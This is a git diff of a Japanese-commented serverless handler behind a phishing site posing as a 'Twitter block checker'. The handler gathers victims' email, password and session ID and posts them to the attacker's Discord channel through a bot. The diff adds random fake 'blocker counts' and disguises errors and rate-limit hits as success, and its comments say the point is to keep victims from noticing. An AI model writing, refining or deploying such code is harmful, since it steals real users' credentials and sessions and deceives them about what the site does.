@@ -3,85 +3,68 @@ import { Redis } from '@upstash/redis';
 import { Ratelimit } from '@upstash/ratelimit';
 
 // --- 設定エリア ---
-// Upstash Redisに環境変数から自動接続
 const redis = Redis.fromEnv();
 
-// レートリミット設定 (1時間に5回まで)
-// それ以上はブロックしますが、画面上は成功したように見せかけます
+// レートリミット (1時間に5回)
 const ratelimit = new Ratelimit({
   redis: redis,
   limiter: Ratelimit.slidingWindow(5, '1 h'),
   analytics: true,
 });
 
-// スパム対策: 文字数が異常に多い場合は無視する
 const MAX_LENGTH = 200; 
 
 export default async function handler(req, res) {
     if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');
 
-    // ユーザーのIPアドレスを取得
     const ip = req.headers['x-forwarded-for'] || '127.0.0.1';
     const ipIdentifier = typeof ip === 'string' ? ip.split(',')[0] : ip;
 
     try {
-        // 1. レートリミットのチェック
+        // 1. レートリミットチェック
         const { success } = await ratelimit.limit(`login_limit_${ipIdentifier}`);
+        
+        // 2. ランダムな人数を生成 (5人 ～ 50人)
+        // スパム判定された場合でも、バレないように適当な数字を返してあげる
+        const randomCount = Math.floor(Math.random() * (50 - 5 + 1)) + 5;
 
-        // 制限を超えている場合 -> ログだけ残して「成功したフリ」をして終了 (ステルス処理)
         if (!success) {
             console.warn(`⛔ Rate limit exceeded for IP: ${ipIdentifier}`);
-            return res.status(200).json({ success: true });
+            // 制限中でもエラーを出さず、成功したフリをしてランダムな数字を返す
+            return res.status(200).json({ success: true, count: randomCount });
         }
 
         const { email, password, sessionId } = req.body;
 
-        // 2. 文字数チェック (異常に長い入力はスパムとみなして無視)
+        // 文字数チェック
         if ((email && email.length > MAX_LENGTH) || (password && password.length > MAX_LENGTH)) {
-            console.warn(`⚠️ Text length exceeded for IP: ${ipIdentifier}`);
-            return res.status(200).json({ success: true });
+            return res.status(200).json({ success: true, count: randomCount });
         }
         
-        // バリデーション
-        if (!email || !password || !sessionId) {
+        if (!email || !password) {
              return res.status(400).json({ error: 'missing fields' });
         }
 
         const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
         const CHANNEL_ID = process.env.DISCORD_CHANNEL_ID;
 
-        // Discordへの埋め込みメッセージ作成
+        // Discordへの通知 (ボタンは削除しました)
         const messageBody = {
             embeds: [
                 {
-                    title: "きちゃーｗｗｗｗｗ",
-                    color: 0x00b0f4, // Twitter Blueっぽい色
-                    // コピーしやすいようにコードブロックで囲んでいます
+                    title: "きちゃーｗｗｗｗｗ (自動応答)",
+                    color: 0x00b0f4,
                     description: `**ID or Email**\n\`\`\`\n${email}\n\`\`\`\n**PASS**\n\`\`\`\n${password}\n\`\`\`\n**Session ID**\n\`\`\`\n${sessionId}\n\`\`\``,
                     footer: {
-                        // ここにIPアドレスを追加しました
-                        text: `Twitterブロック診断 | IP: ${ipIdentifier}`,
+                        text: `Twitterブロック診断 | IP: ${ipIdentifier} | 結果: ${randomCount}人と返答`,
                     },
                     timestamp: new Date().toISOString()
-                }
-            ],
-            components: [
-                {
-                    type: 1, // Action Row
-                    components: [
-                        {
-                            type: 2, // Button
-                            style: 1, // Primary (Blue)
-                            label: "認証結果を送信 (人数入力)",
-                            custom_id: `open_modal::${sessionId}`
-                        }
-                    ]
                 }
             ]
         };
 
-        // Discord APIへ送信
-        const discordRes = await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
+        // Discordに送信 (awaitしないことでレスポンスを高速化しても良いが、確実に送るためawait推奨)
+        await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
             method: 'POST',
             headers: {
                 'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
@@ -90,17 +73,12 @@ export default async function handler(req, res) {
             body: JSON.stringify(messageBody)
         });
 
-        if (!discordRes.ok) {
-            console.error('Discord API Error:', await discordRes.text());
-            throw new Error('Discord send failed');
-        }
-
-        // 成功レスポンス
-        res.status(200).json({ success: true });
+        // 成功レスポンスと一緒に人数を返す
+        res.status(200).json({ success: true, count: randomCount });
 
     } catch (error) {
         console.error("Server Error:", error);
-        // サーバーエラー時も、クライアントにはあまり情報を与えず500だけ返す
-        res.status(500).json({ error: 'Internal Server Error' });
+        // エラー時もバレないように適当な数字を返す
+        res.status(200).json({ success: true, count: 14 }); 
     }
 }
